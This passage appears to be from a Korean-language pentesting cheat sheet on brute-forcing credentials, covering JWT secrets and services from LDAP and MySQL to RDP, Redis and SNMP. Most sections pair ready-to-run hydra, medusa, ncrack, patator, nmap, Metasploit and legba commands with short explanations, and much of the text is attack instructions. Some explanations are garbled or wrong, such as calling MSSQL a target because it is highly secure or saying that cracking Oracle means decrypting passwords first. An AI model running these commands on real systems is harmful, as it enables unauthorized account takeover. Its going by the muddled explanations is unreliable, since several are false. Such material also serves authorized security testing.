python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP은 경량 디렉터리 액세스 프로토콜(Lightweight Directory Access Protocol)의 약자입니다. 이 프로토콜은 디렉터리 서비스에 액세스하기 위해 사용되며, 주로 사용자 인증 및 권한 부여와 같은 작업에 활용됩니다.

LDAP을 사용하여 브루트 포스 공격을 수행할 때, 다음과 같은 방법을 사용할 수 있습니다:

1. 사용자 계정 브루트 포스: LDAP 서버에 대해 알려진 사용자 계정 목록을 사용하여 로그인을 시도합니다. 이를 통해 알려진 사용자 계정의 암호를 추측하고 액세스를 시도할 수 있습니다.

2. 암호 브루트 포스: 알려진 사용자 계정에 대해 가능한 모든 암호 조합을 시도하여 액세스를 시도합니다. 이를 통해 암호를 추측하고 액세스를 시도할 수 있습니다.

LDAP 브루트 포스 공격을 수행할 때는 다음과 같은 주의 사항을 염두에 두어야 합니다:

- 브루트 포스 공격은 시간이 많이 소요될 수 있으므로, 효율적인 알고리즘과 도구를 사용하는 것이 중요합니다.
- 대상 시스템에서 브루트 포스 공격을 탐지하고 차단하는 방어 메커니즘이 있는지 확인해야 합니다.
- 브루트 포스 공격을 수행하기 전에, 암호 정책을 분석하고 가능한 암호 조합을 파악하는 것이 유용합니다.

LDAP 브루트 포스 공격은 합법적인 펜테스트 활동의 일부로 수행되어야 하며, 권한 없는 시스템에 대한 불법적인 액세스를 시도하는 것은 불법입니다.
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT

MQTT는 Message Queuing Telemetry Transport의 약자로, 경량 프로토콜로 알려져 있습니다. 이 프로토콜은 IoT(Internet of Things) 장치 간에 데이터를 교환하기 위해 설계되었습니다. MQTT는 TCP/IP 프로토콜 위에서 동작하며, 발행-구독(Publish-Subscribe) 메시징 패턴을 사용합니다.

MQTT는 브로커(Broker)라고 불리는 중개자를 통해 메시지를 전송합니다. 클라이언트는 브로커에게 메시지를 발행하거나, 특정 주제(Topic)를 구독하여 메시지를 수신할 수 있습니다. 이러한 특징은 MQTT를 실시간 통신에 적합하게 만들어줍니다.

MQTT는 간단하고 효율적인 프로토콜이지만, 암호화 및 인증 기능이 제한적일 수 있습니다. 따라서 MQTT를 사용하는 경우, 보안을 강화하기 위해 추가적인 조치를 취해야 합니다.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### 몽고

MongoDB is a popular NoSQL database that is widely used in web applications. It is known for its flexibility and scalability, making it a preferred choice for many developers. However, like any other database, MongoDB is not immune to security vulnerabilities. One common attack vector against MongoDB is brute force attacks.

#### Brute Force Attacks on MongoDB

Brute force attacks involve systematically trying all possible combinations of usernames and passwords until the correct one is found. In the context of MongoDB, this means attempting to guess the correct username and password combination to gain unauthorized access to the database.

#### Preventing Brute Force Attacks

To protect your MongoDB database from brute force attacks, it is important to follow some best practices:

1. **Use Strong Passwords**: Ensure that you use strong and complex passwords for your MongoDB accounts. Avoid using common or easily guessable passwords.

2. **Implement Account Lockout**: Set up account lockout policies that temporarily lock an account after a certain number of failed login attempts. This can help prevent brute force attacks by slowing down the attacker's progress.

3. **Enable Authentication**: Always enable authentication for your MongoDB database. This ensures that only authorized users can access the database.

4. **Limit Network Access**: Restrict network access to your MongoDB database by allowing connections only from trusted IP addresses or networks. This can help prevent unauthorized access attempts.

5. **Monitor Logs**: Regularly monitor the logs of your MongoDB database for any suspicious activity. Look for repeated failed login attempts or unusual patterns that may indicate a brute force attack.

By following these best practices, you can significantly reduce the risk of brute force attacks on your MongoDB database. Remember to regularly update your MongoDB installation and keep an eye on the latest security patches and updates.
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

MSSQL은 Microsoft SQL Server의 약어로, 관계형 데이터베이스 관리 시스템(RDBMS)입니다. 이 데이터베이스 시스템은 Windows 운영 체제에서 실행되며, 기업 및 조직에서 데이터 저장, 관리 및 검색에 널리 사용됩니다.

MSSQL은 높은 보안 수준을 제공하기 때문에 해킹 공격의 주요 대상이 될 수 있습니다. 해커들은 다양한 무차별 대입(brute-force) 기술을 사용하여 MSSQL 서버에 액세스하려고 시도합니다.

MSSQL 무차별 대입 공격은 다음과 같은 방법으로 수행될 수 있습니다:

1. **사전 공격**: 해커는 일반적으로 사용되는 암호 목록이나 사전 파일을 사용하여 MSSQL 서버에 대한 암호를 추측합니다. 이러한 목록은 일반적으로 암호화된 형식으로 제공되며, 해커는 이를 해독하여 암호를 추측합니다.

2. **브루트 포스 공격**: 해커는 가능한 모든 암호 조합을 시도하여 MSSQL 서버에 대한 암호를 찾으려고 합니다. 이는 시간이 많이 소요되지만, 암호가 약하거나 예측 가능한 경우에는 효과적일 수 있습니다.

3. **사회 공학**: 해커는 사회 공학 기술을 사용하여 MSSQL 서버에 액세스하기 위해 사용자의 암호를 추측하거나 조작합니다. 이는 사용자의 신뢰를 높이거나 소셜 엔지니어링 공격을 통해 암호를 얻는 데 사용될 수 있습니다.

MSSQL 서버를 보호하기 위해 다음과 같은 조치를 취할 수 있습니다:

- 강력한 암호 정책을 설정하고, 주기적으로 암호를 변경합니다.
- 암호 잠금 정책을 설정하여 일정 횟수 이상의 실패한 로그인 시도로부터 계정을 보호합니다.
- MSSQL 서버에 대한 외부 액세스를 제한하고, 방화벽을 사용하여 불필요한 포트를 차단합니다.
- 최신 보안 패치를 설치하고, 보안 업데이트를 주기적으로 적용합니다.

MSSQL 서버의 보안을 강화하는 것은 중요한 작업이며, 해킹 공격으로부터 데이터를 보호하는 데 필수적입니다.
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

MySQL은 오픈 소스 관계형 데이터베이스 관리 시스템(RDBMS)입니다. MySQL은 다양한 운영 체제에서 사용할 수 있으며, 웹 애플리케이션과 데이터베이스 드라이버를 통해 데이터를 저장, 관리 및 검색할 수 있습니다.

MySQL 데이터베이스에 대한 브루트 포스(brute force) 공격은 알려진 사용자 이름과 비밀번호 목록을 사용하여 로그인 자격 증명을 찾는 공격입니다. 이러한 공격은 암호화되지 않은 연결에서 특히 취약합니다.

MySQL 브루트 포스 공격을 방지하기 위해 다음과 같은 조치를 취할 수 있습니다:

- 강력한 암호 정책을 설정하여 사용자가 강력한 비밀번호를 사용하도록 유도합니다.
- 계정 잠금 정책을 설정하여 일정 횟수 이상의 실패한 로그인 시도로부터 계정을 보호합니다.
- IP 주소 기반의 액세스 제어를 구성하여 허용되지 않은 IP 주소에서의 로그인을 차단합니다.
- MySQL 서버를 최신 버전으로 업데이트하여 보안 패치를 적용합니다.

MySQL 브루트 포스 공격은 보안 취약점을 이용하여 시스템에 침투하려는 공격자들에게 매우 유용한 기술입니다. 따라서 MySQL 데이터베이스를 보호하기 위해 이러한 공격에 대비하는 것이 중요합니다.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
# OracleSQL

## 브루트 포스 공격

브루트 포스 공격은 시스템에 대한 암호를 찾기 위해 가능한 모든 조합을 시도하는 공격입니다. OracleSQL에서 브루트 포스 공격을 수행하는 방법은 다음과 같습니다.

1. 사용자 계정 식별: 먼저, 공격 대상 시스템에서 사용자 계정을 식별해야 합니다. 이를 위해 다양한 방법을 사용할 수 있습니다. 예를 들어, 시스템에 대한 기본 사용자 계정 이름을 알고 있다면 해당 계정으로 로그인을 시도할 수 있습니다.

2. 암호화된 암호 해독: 사용자 계정을 식별한 후, 암호화된 암호를 해독해야 합니다. 이를 위해 다양한 기술과 도구를 사용할 수 있습니다. 예를 들어, 암호화된 암호를 레인보우 테이블을 사용하여 해독할 수 있습니다.

3. 암호 조합 시도: 암호를 해독한 후, 가능한 모든 암호 조합을 시도해야 합니다. 이를 위해 자동화된 스크립트나 도구를 사용할 수 있습니다. 예를 들어, 미리 정의된 암호 목록을 사용하여 암호를 시도할 수 있습니다.

4. 성공 여부 확인: 암호 조합을 시도한 후, 성공 여부를 확인해야 합니다. 성공한 경우, 시스템에 로그인할 수 있는 암호를 찾은 것입니다.

브루트 포스 공격은 시간이 많이 소요되고, 성공할 가능성이 낮을 수 있습니다. 따라서, 효과적인 브루트 포스 공격을 수행하기 위해서는 암호의 복잡성을 고려하고, 자동화된 도구를 사용하여 공격을 수행해야 합니다.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
**oracle_login**을 **patator**와 함께 사용하려면 다음을 **설치**해야 합니다:
```bash
pip3 install cx_Oracle --upgrade
```
[오프라인 OracleSQL 해시 브루트포스](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**버전 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** 그리고 **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

POP (Post Office Protocol)는 전자 메일을 수신하는 데 사용되는 인터넷 프로토콜입니다. POP는 일반적으로 이메일 클라이언트와 이메일 서버 간의 통신에 사용됩니다. 이 프로토콜은 사용자의 이메일 서버에서 이메일을 다운로드하여 로컬 컴퓨터에 저장합니다.

POP는 일반적으로 TCP 포트 110을 사용하여 통신합니다. 이메일 클라이언트는 POP 서버에 연결하여 사용자의 계정 자격 증명을 제공하고, 이메일을 다운로드하고, 서버에서 이메일을 삭제하는 등의 작업을 수행합니다.

POP는 보안 기능이 제한적이며, 암호화되지 않은 텍스트로 사용자의 계정 자격 증명을 전송합니다. 따라서, POP를 사용할 때는 보안에 주의해야 합니다. 암호화된 연결을 사용하거나, 대신 IMAP (Internet Message Access Protocol)와 같은 보다 안전한 프로토콜을 고려할 수 있습니다.

POP는 또한 브루트 포스 공격에 취약할 수 있습니다. 브루트 포스 공격은 모든 가능한 조합의 비밀번호를 시도하여 올바른 비밀번호를 찾는 공격입니다. 이를 방지하기 위해 강력한 비밀번호를 사용하고, 계정 잠금 기능을 활성화하는 것이 좋습니다.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

PostgreSQL은 오픈 소스 객체-관계형 데이터베이스 관리 시스템(ORDBMS)입니다. PostgreSQL은 다양한 기능과 확장성을 제공하여 데이터베이스 관리를 용이하게 합니다. 이 데이터베이스 시스템은 안정성, 신뢰성 및 성능에 중점을 둡니다.

PostgreSQL 데이터베이스에 대한 무차별 대입(brute force) 공격은 암호를 추측하여 데이터베이스에 액세스하는 시도입니다. 이러한 공격은 일반적으로 암호화되지 않은 연결을 통해 이루어지며, 암호화된 연결을 사용하는 경우에도 가능합니다.

PostgreSQL 무차별 대입 공격을 방지하기 위해 다음과 같은 조치를 취할 수 있습니다.

- 강력한 암호 정책을 설정하여 암호의 복잡성을 강화합니다.
- 계정 잠금 정책을 설정하여 일정 횟수 이상의 실패한 로그인 시도로부터 계정을 보호합니다.
- IP 주소 기반의 접근 제어 목록을 구성하여 허용되지 않은 IP 주소에서의 액세스를 차단합니다.
- 암호화된 연결을 사용하여 데이터베이스에 접속합니다.

PostgreSQL 데이터베이스에 대한 무차별 대입 공격은 보안 위협으로 간주되며, 적절한 보안 조치를 취하여 데이터베이스를 보호해야 합니다.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

[https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)에서 `.deb` 패키지를 다운로드하여 설치할 수 있습니다.
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

RDP (Remote Desktop Protocol)는 원격으로 컴퓨터에 액세스하기 위해 사용되는 프로토콜입니다. RDP는 Windows 운영 체제에서 기본적으로 제공되며, 원격으로 컴퓨터를 제어하고 파일을 전송하고 프로그램을 실행하는 데 사용됩니다.

RDP 브루트 포스 공격은 RDP 서비스에 대한 암호를 추측하여 액세스를 시도하는 공격입니다. 이 공격은 일반적으로 암호를 무작위로 시도하여 올바른 암호를 찾을 때까지 계속됩니다.

RDP 브루트 포스 공격을 수행하기 위해 다양한 도구와 기술이 사용될 수 있습니다. 일반적으로 사전 공격, 무차별 대입 공격, 사전 공격과 무차별 대입 공격의 조합 등이 사용됩니다.

RDP 브루트 포스 공격을 방지하기 위해 다음과 같은 조치를 취할 수 있습니다:

- 강력한 암호 정책을 설정하고 암호 강도를 강화합니다.
- 계정 잠금 정책을 설정하여 일정 횟수 이상의 실패한 로그인 시도로부터 계정을 보호합니다.
- RDP 서비스를 외부에서 액세스할 수 없도록 방화벽을 구성합니다.
- RDP 서비스에 대한 액세스를 제한하는 IP 주소 필터링을 구현합니다.
- 다중 요인 인증을 사용하여 추가 보안을 제공합니다.

RDP 브루트 포스 공격은 암호를 추측하여 액세스를 시도하기 때문에 강력한 암호 정책과 보안 조치를 적용하는 것이 중요합니다.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis

Redis는 인메모리 데이터 구조 저장소로, 다양한 데이터 구조를 지원하며 높은 성능을 제공합니다. Redis는 키-값 쌍을 저장하고 조회할 수 있으며, 문자열, 해시, 리스트, 집합, 정렬된 집합 등 다양한 데이터 구조를 지원합니다.

Redis에 대한 브루트 포스 공격은 다양한 방법으로 수행될 수 있습니다. 가장 일반적인 방법은 알려진 암호나 사전에서 비밀번호를 시도하는 것입니다. 이를 위해 다양한 도구와 스크립트가 사용될 수 있습니다.

Redis 브루트 포스 공격을 방지하기 위해 다음과 같은 조치를 취할 수 있습니다:

- 강력한 암호를 사용하십시오. 암호는 길고 복잡하며 예측하기 어렵게 설정해야 합니다.
- Redis 인스턴스에 대한 액세스를 제한하십시오. 필요한 경우 방화벽 또는 네트워크 보안 그룹을 사용하여 액세스를 제어할 수 있습니다.
- Redis 인스턴스를 업데이트하고 보안 패치를 적용하십시오. 최신 버전의 Redis를 사용하여 알려진 보안 취약점을 해결할 수 있습니다.
- Redis 인스턴스에 대한 모니터링을 수행하십시오. 알 수 없는 액세스나 이상한 활동을 감지하면 즉시 조치를 취할 수 있습니다.

Redis 브루트 포스 공격은 약점을 이용하여 인증을 우회하거나 민감한 데이터를 노출시킬 수 있으므로, 적절한 보안 조치를 취하는 것이 중요합니다.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

Rexec (Remote Execution) is a network service that allows users to execute commands on a remote system. It is commonly used for administrative purposes, such as managing multiple systems from a central location.

#### Brute-Force Attack on Rexec

A brute-force attack on Rexec involves systematically trying all possible combinations of usernames and passwords until the correct credentials are found. This attack can be automated using tools like Hydra or Medusa.

To perform a brute-force attack on Rexec, follow these steps:

1. Identify the target Rexec service.
2. Gather a list of possible usernames and passwords.
3. Use a brute-force tool to automate the attack.
4. Monitor the tool's progress and wait for successful authentication.
5. Once the correct credentials are found, use them to gain unauthorized access to the remote system.

#### Countermeasures

To protect against brute-force attacks on Rexec, consider implementing the following countermeasures:

1. Use strong and complex passwords that are difficult to guess.
2. Implement account lockout policies to prevent multiple failed login attempts.
3. Monitor and analyze logs for any suspicious activity.
4. Limit access to the Rexec service to trusted IP addresses only.
5. Consider using multi-factor authentication to add an extra layer of security.

By following these countermeasures, you can significantly reduce the risk of a successful brute-force attack on Rexec.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin은 원격 로그인 프로토콜로, 원격 시스템에 로그인하기 위해 사용됩니다. 이 프로토콜은 클라이언트와 서버 간에 텍스트 기반의 통신을 제공합니다. Rlogin은 일반적으로 UNIX 및 Linux 시스템에서 사용되며, 로그인 정보를 암호화하지 않기 때문에 보안에 취약합니다.

Rlogin을 사용하여 시스템에 접근하려는 경우, 브루트 포스 공격을 사용할 수 있습니다. 브루트 포스 공격은 가능한 모든 암호 조합을 시도하여 올바른 암호를 찾는 공격입니다. 이를 위해 사전에 정의된 암호 목록이나 암호 생성기를 사용할 수 있습니다.

Rlogin 서비스에 대한 브루트 포스 공격을 수행하기 위해 다음 단계를 따를 수 있습니다:

1. Rlogin 서비스가 실행 중인지 확인합니다.
2. 브루트 포스 도구를 사용하여 가능한 암호 조합을 시도합니다.
3. 올바른 암호를 찾을 때까지 반복합니다.

브루트 포스 공격은 시간이 오래 걸릴 수 있으며, 대상 시스템에서 이상한 활동을 감지할 수 있으므로 주의해야 합니다. 따라서 브루트 포스 공격을 수행할 때는 조심해야 합니다.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh (Remote Shell)는 원격 시스템에 로그인하고 명령을 실행하기 위한 프로토콜입니다. Rsh는 일반적으로 UNIX 및 Linux 시스템에서 사용됩니다. Rsh는 클라이언트-서버 모델을 따르며, 클라이언트는 원격 시스템에 로그인하고 명령을 전송하고, 서버는 해당 명령을 실행하고 결과를 클라이언트에게 반환합니다.

Rsh는 보안에 취약하며, 암호화되지 않은 통신을 사용하기 때문에 중간에 가로채기가 가능합니다. 따라서 Rsh를 사용하여 원격 시스템에 접속할 때는 보안상의 위험을 감안해야 합니다. 대부분의 경우 SSH (Secure Shell)를 사용하여 Rsh를 대체하는 것이 좋습니다.

Rsh를 사용하여 무차별 대입(brute force) 공격을 수행할 수도 있습니다. 이는 다양한 사용자 이름과 비밀번호 조합을 시도하여 로그인에 성공할 수 있는 조합을 찾는 공격입니다. 무차별 대입 공격은 시간이 오래 걸릴 수 있지만, 약한 암호를 사용하는 사용자 계정을 찾을 수 있는 효과적인 방법입니다.

Rsh를 사용하여 무차별 대입 공격을 수행하려면 다음 단계를 따르면 됩니다:

1. 대상 시스템의 Rsh 서비스가 활성화되어 있는지 확인합니다.
2. 대상 시스템에 대한 사용자 이름 목록을 수집합니다.
3. 대상 시스템에 대한 비밀번호 목록을 수집합니다.
4. 수집한 사용자 이름과 비밀번호 조합을 사용하여 Rsh를 통해 로그인을 시도합니다.
5. 로그인에 성공한 경우, 원격 시스템에 대한 액세스 권한을 확보합니다.

무차별 대입 공격은 시스템의 보안을 테스트하거나 약한 암호를 사용하는 사용자 계정을 찾는 데 유용할 수 있습니다. 그러나 이러한 공격은 대상 시스템에 불필요한 부하를 주거나 불법적인 접근을 시도하는 것으로 간주될 수 있으므로, 합법적인 테스트나 권한을 얻기 위한 목적으로만 사용해야 합니다.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync는 원격 시스템 간에 파일 및 디렉토리를 동기화하는 데 사용되는 유용한 도구입니다. 이는 변경된 파일만 전송하여 대역폭을 절약하고 전체 파일을 다시 전송하지 않아도 되는 장점이 있습니다. Rsync는 SSH를 통해 보안된 연결을 사용하며, 대부분의 리눅스 배포판에 기본적으로 설치되어 있습니다.

Rsync는 일반적으로 백업, 동기화 및 원격 복사에 사용됩니다. 그러나 악용될 수도 있습니다. 예를 들어, Rsync 서버가 취약한 경우 공격자는 파일을 읽거나 쓸 수 있으며, 시스템에 악성 파일을 전송할 수도 있습니다.

Rsync 서버에 대한 무차별 대입(brute force) 공격은 일반적으로 사용자 이름과 비밀번호 조합을 시도하여 액세스를 얻으려고 시도하는 것입니다. 이를 통해 공격자는 약한 자격 증명을 찾을 수 있으며, 시스템에 대한 권한을 획득할 수 있습니다.

Rsync 서버에 대한 무차별 대입 공격을 수행하기 위해 다양한 도구와 기술이 사용될 수 있습니다. 이러한 도구와 기술은 대부분 자동화되어 있으며, 대량의 사용자 이름과 비밀번호 조합을 시도할 수 있습니다. 이러한 공격은 시간이 오래 걸릴 수 있으며, 효과적으로 수행하기 위해서는 강력한 컴퓨팅 자원이 필요합니다.

Rsync 서버에 대한 무차별 대입 공격을 방지하기 위해 강력한 암호 정책을 사용하고, 액세스 제어 목록(ACL)을 구성하여 허용되는 IP 주소만 연결할 수 있도록 설정하는 것이 좋습니다. 또한, Rsync 서버를 최신 버전으로 업데이트하고 보안 패치를 적용하는 것도 중요합니다.
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP (Real-Time Streaming Protocol)는 네트워크를 통해 실시간으로 미디어 데이터를 전송하기 위한 프로토콜입니다. RTSP는 클라이언트와 서버 간에 미디어 스트림을 제어하고 전송하기 위해 사용됩니다. 이 프로토콜은 주로 IP 카메라, 비디오 서버 및 스트리밍 미디어 서버와 같은 장치에서 사용됩니다.

RTSP는 브루트 포스 공격에 취약할 수 있습니다. 브루트 포스 공격은 모든 가능한 조합을 시도하여 암호를 찾는 공격입니다. RTSP 서버에 대한 브루트 포스 공격을 수행하려면 다음 단계를 따르십시오.

1. 사용자 이름과 암호 목록을 작성합니다.
2. 브루트 포스 도구를 사용하여 RTSP 서버에 대한 인증을 시도합니다.
3. 올바른 사용자 이름과 암호를 찾을 때까지 모든 가능한 조합을 시도합니다.

RTSP 서버에 대한 브루트 포스 공격은 시간이 오래 걸릴 수 있으며, 서버에서 이러한 공격을 탐지하고 차단할 수도 있습니다. 따라서 이러한 공격을 수행할 때는 주의해야 합니다.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP

SFTP (Secure File Transfer Protocol)는 SSH (Secure Shell) 프로토콜을 사용하여 파일을 안전하게 전송하는 프로토콜입니다. SFTP는 데이터의 기밀성과 무결성을 보장하기 위해 암호화를 사용합니다.

SFTP는 일반적으로 파일 전송을 위해 사용되며, 원격 서버에 파일을 업로드하거나 다운로드하는 데 사용될 수 있습니다. SFTP는 SSH 서버에 연결하여 파일을 전송하고 관리하는 데 사용됩니다.

SFTP는 브루트 포스 공격에 취약할 수 있습니다. 브루트 포스 공격은 모든 가능한 조합을 시도하여 암호를 찾는 공격입니다. SFTP 서버에 대한 브루트 포스 공격을 방지하기 위해 강력한 암호를 사용하고, 계정 잠금 정책을 설정하고, 접속 시도 횟수를 제한하는 등의 보안 조치를 취해야 합니다.

SFTP 서버를 해킹하기 위해 브루트 포스 공격을 사용할 수 있습니다. 이를 방지하기 위해 SFTP 서버에 대한 암호 복잡성을 강화하고, 계정 잠금 정책을 설정하고, 접속 시도 횟수를 제한하는 등의 보안 조치를 취해야 합니다.

SFTP 서버에 대한 브루트 포스 공격을 감지하고 방지하기 위해 로그 분석 및 모니터링 도구를 사용할 수 있습니다. 이러한 도구는 잘못된 로그인 시도를 식별하고, 이상한 활동을 감지하여 적절한 조치를 취할 수 있도록 도와줍니다.

SFTP 서버를 보호하기 위해 방화벽을 사용할 수 있습니다. 방화벽은 외부에서의 액세스를 제한하고, 브루트 포스 공격과 같은 악성 활동을 차단하는 데 도움이 됩니다.

SFTP 서버를 안전하게 유지하기 위해 정기적인 보안 패치와 업데이트를 수행해야 합니다. 이는 알려진 취약점을 해결하고, 보안 강화를 위한 최신 기능을 제공합니다.

SFTP 서버를 해킹하는 데 성공한 경우, 중요한 파일이나 데이터가 유출될 수 있습니다. 따라서 SFTP 서버를 보호하기 위해 백업 및 복구 계획을 수립하고, 데이터의 안전한 보관을 위한 암호화 및 접근 제어를 구현해야 합니다.
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

SNMP(Simple Network Management Protocol)은 네트워크 장치들을 관리하기 위해 사용되는 프로토콜입니다. SNMP는 네트워크 장치들의 상태 정보를 수집하고, 설정을 변경하며, 경고를 생성하는 등의 기능을 제공합니다. SNMP는 주로 시스템 관리자나 네트워크 관리자들이 네트워크 장치들을 모니터링하고 관리하기 위해 사용됩니다.

SNMP는 일반적으로 UDP(User Datagram Protocol)를 사용하여 통신하며, SNMP 에이전트와 SNMP 관리자 간의 상호작용을 위한 메시지를 정의합니다. SNMP 에이전트는 네트워크 장치에 설치되어 있으며, SNMP 관리자는 네트워크 장치들을 관리하기 위해 사용되는 소프트웨어입니다.

SNMP는 보안상의 이유로 인해 인증 및 암호화 기능을 제공합니다. SNMPv3는 인증 및 암호화를 위한 보안 기능을 제공하며, SNMPv1 및 SNMPv2c는 보안 기능을 제공하지 않습니다. 따라서 SNMPv3를 사용하여 네트워크 장치들을 보다 안전하게 관리할 수 있습니다.

SNMP는 브루트 포스 공격에 취약할 수 있습니다. 브루트 포스 공격은 모든 가능한 조합을 시도하여 암호를 찾는 공격입니다. SNMP 에이전트에 대한 브루트 포스 공격은 SNMP 커뮤니티 문자열을 추측하여 액세스 권한을 얻는 것을 목표로 합니다. 따라서 SNMP 에이전트에 대한 액세스 권한을 보호하기 위해 강력한 커뮤니티 문자열을 사용하고, SNMPv3를 사용하여 암호화 및 인증 기능을 활성화하는 것이 좋습니다.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB(Samba)은 Windows 운영 체제에서 파일 및 프린터 공유를 위해 사용되는 프로토콜입니다. SMB는 네트워크 상에서 파일 및 리소스를 공유하기 위해 사용되며, 클라이언트와 서버 간의 통신을 가능하게 합니다.

SMB는 일반적으로 TCP/IP를 기반으로 작동하며, 445번 포트를 사용하여 통신합니다. 이 프로토콜은 인증 및 권한 부여를 위한 기능을 제공하며, 파일 및 디렉토리에 대한 액세스 제어를 가능하게 합니다.

SMB는 브루트 포스 공격에 취약할 수 있습니다. 브루트 포스 공격은 다양한 암호 조합을 시도하여 암호를 추측하는 공격 방법입니다. 이를 통해 암호를 알아낼 수 있으며, 악용될 수 있습니다.

